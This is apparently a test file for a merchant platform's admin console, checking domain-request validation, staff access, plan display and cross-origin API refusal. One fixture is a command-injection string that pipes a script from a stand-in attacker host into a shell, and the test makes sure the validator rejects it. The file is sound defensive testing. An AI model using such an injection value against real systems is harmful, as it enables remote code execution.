// The super admin console on its own host: a domain a merchant asked for becomes a command only when it is a host name that
// is not a BorNiz host and no other business asked for it; BorNiz staff who also belong to a business still get the console;
// a guest screen's plan is the one BorNiz set, not the merchant's own document; the API takes JSON from its own pages only.
import { after, test } from 'node:test';
import assert from 'node:assert/strict';

process.env.NEXT_PUBLIC_BORNIZ_ROUTING = 'subdomain';
process.env.NEXT_PUBLIC_BORNIZ_ROOT_DOMAIN = 'bornis.id';
(globalThis as { location?: unknown }).location = { host: 'admin.bornis.id', hostname: 'admin.bornis.id', pathname: '/', origin: 'https://admin.bornis.id', search: '', hash: '' };

test('a requested domain is a command only when it is safe and uncontested', async () => {
  const { domainRequests } = await import('../system/hosts.ts');
  const asks = [{ slug: 'kopi-a', domain: 'menu.kopia.id' }, { slug: 'evil', domain: 'x.id;curl evil.sh|sh;#' }, { slug: 'grab', domain: 'admin.bornis.id' },
    { slug: 'b1', domain: 'order.same.id' }, { slug: 'b2', domain: 'order.same.id' }];
  const r = domainRequests(asks, {});
  assert.deepEqual(r.map(x => [x.host, x.slug, x.problem ?? '']), [
    ['menu.kopia.id', 'kopi-a', ''], ['order.same.id', 'b1', 'asked by 2 businesses'], ['order.same.id', 'b2', 'asked by 2 businesses']]);
});

test('BorNiz staff who also belong to a business get the console on admin.', async () => {
  globalThis.fetch = (async (url: string) => new Response(JSON.stringify(String(url).endsWith('auth/user')
    ? { data: { user: { id: 'u1', email: 'staff@bornis.id', is_anonymous: false, user_metadata: {} } } }
    : { data: [{ tenant_id: 't1', employee_id: 'budi', role: 'owner', slug: 'kopibiru', name: 'Kopi Biru', plan: 'free' }] }))) as typeof fetch;
  const { membership } = await import('./backend.ts');
  assert.equal(await membership(), null, 'no business opens on the admin host');
});

test('a guest screen shows the plan BorNiz set', async () => {
  const { guestBase } = await import('./remoteStore.ts');
  const d = guestBase({ tenant: { id: 't1', slug: 'kopibiru', name: 'Kopi Biru', plan: 'free' }, docs: [{ coll: '_meta', id: 'tenant', data: { id: 'kopibiru', name: 'Kopi Biru', plan: 'enterprise' } }], portions: [] }, 'kopibiru', null);
  assert.equal(d.tenant.plan, 'free');
});

test('the API refuses a form post from another page (no preflight) and another host’s origin', async () => {
  process.env.DATABASE_URL ||= 'postgres://nobody@127.0.0.1:1/none';
  const { POST } = await import('../../app/api/bn/[...op]/route.ts');
  const call = (headers: Record<string, string>) => POST(new Request('https://admin.bornis.id/api/bn/rpc/bn_admin_set_plan', { method: 'POST', headers: { host: 'admin.bornis.id', ...headers }, body: '{"p_tenant":"x","p_plan":"enterprise"}' }), { params: Promise.resolve({ op: ['rpc', 'bn_admin_set_plan'] }) });
  assert.equal((await call({ 'content-type': 'text/plain', origin: 'https://kopibiru.bornis.id' })).status, 403);
  assert.equal((await call({ 'content-type': 'application/json', origin: 'https://kopibiru.bornis.id' })).status, 403);
});
// the backend client keeps a BroadcastChannel and the route a database pool open
after(() => setImmediate(() => process.exit(0)));
